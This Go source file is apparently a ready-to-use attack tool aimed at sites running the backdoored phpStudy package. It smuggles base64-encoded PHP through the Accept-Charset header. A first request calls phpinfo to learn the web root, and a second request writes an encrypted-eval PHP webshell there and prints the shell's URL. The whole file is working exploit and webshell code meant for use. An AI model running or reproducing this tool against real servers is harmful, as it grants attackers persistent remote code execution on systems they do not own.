package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

func httpDo(url string, file string, wwwroot string) {
	client := &http.Client{}
	shell := `
	<?php
	@error_reporting(0);
	session_start();
	if (isset($_GET['help']))
	{
		$key=substr(md5(uniqid(rand())),16);
		$_SESSION['k']=$key;
		print $key;
	}
	else
	{
		$key=$_SESSION['k'];
		$post=file_get_contents("php://input");
		if(!extension_loaded('openssl'))
		{
			$t="base64_"."decode";
			$post=$t($post."");
			
			for($i=0;$i<strlen($post);$i++) {
					 $post[$i] = $post[$i]^$key[$i+1&15]; 
					}
		}
		else
		{
			$post=openssl_decrypt($post, "AES128", $key);
		}
		$arr=explode('|',$post);
		$func=$arr[0];
		$params=$arr[1];
		class C{public function __construct($p) {eval($p."");}}
		@new C($params);
	}
	?>
			`
	payload := "file_put_contents(\"" + wwwroot + "/" + file + "\"," + shell + ");"
	fmt.Println(payload)
	str := []byte(payload)
	payloads := base64.StdEncoding.EncodeToString(str)
	req, err := http.NewRequest("GET", url+"/index.php", nil)
	if err != nil {
		fmt.Println("主机可能不存活!!")
		os.Exit(0)
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("accept-charset", payloads)
	req.Header.Set("Connection", "keep-alive")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("主机可能不存活")
	} else {
		defer resp.Body.Close()
	}
	shellurl := url + "/" + file
	reqshell, err := http.Get(shellurl)
	if err != nil {
		fmt.Println("上传失败")
		return
	} else {
		fmt.Println("上传成功, webshell地址:" + shellurl)
	}
	defer reqshell.Body.Close()
}

func main() {
	var url string
	//	var password string
	var file string
	flag.StringVar(&url, "u", "", "http(s)://url")
	//	flag.StringVar(&password, "p", "pass", "webshell's password")
	flag.StringVar(&file, "f", "webshell.php", "webshell's filename")
	flag.Parse()
	if url == "" {
		fmt.Println("use : phpstudy_webshell.exe -f webshell's filename -p webshell's password")
		os.Exit(0)
	}
	wwwroot := getroot(url)
	httpDo(url, file, wwwroot)
}

//获取网站目录,goquery应该有更简单的方法获取table的值
func getroot(url string) string {
	var list []string
	var wwwroot string
	client := &http.Client{}
	req, err := http.NewRequest("GET", url+"/index.php", nil)
	if err != nil {
		fmt.Println("主机可能不存活!!")
		os.Exit(0)
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("accept-charset", "cGhwaW5mbygpOw==")
	req.Header.Set("Connection", "keep-alive")
	resp, err := client.Do(req)
	defer resp.Body.Close()
	body, _ := goquery.NewDocumentFromReader(resp.Body)
	body.Find("td").Each(func(i int, selection *goquery.Selection) {
		list = append(list, strings.TrimSpace(selection.Text()))
	})
	for i, text := range list {
		if text == "DOCUMENT_ROOT" || text == "_SERVER[\"DOCUMENT_ROOT\"]" {
			fmt.Println("路径:" + list[i+1])
			wwwroot = list[i+1]
			break
		}
	}
	return wwwroot
}
